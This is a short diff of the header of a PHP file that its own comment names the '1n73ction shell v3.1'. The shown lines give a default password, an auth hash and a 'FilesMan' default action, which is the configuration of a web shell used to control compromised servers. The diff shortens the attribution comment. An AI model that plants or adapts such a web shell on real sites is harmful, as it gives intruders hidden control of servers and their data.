@@ -1,5 +1,5 @@
 <?
-/* (1n73ction shell v3.1 by x'1n73ct|default pass:" 1n73ction ") */
+/* x'1n73ct|p: 1n73ction*/
 $auth_pass = "9c80a1eaca699e2fc6b994721f8703bc";
 $color = "#00ff00";
 $default_action = 'FilesMan';
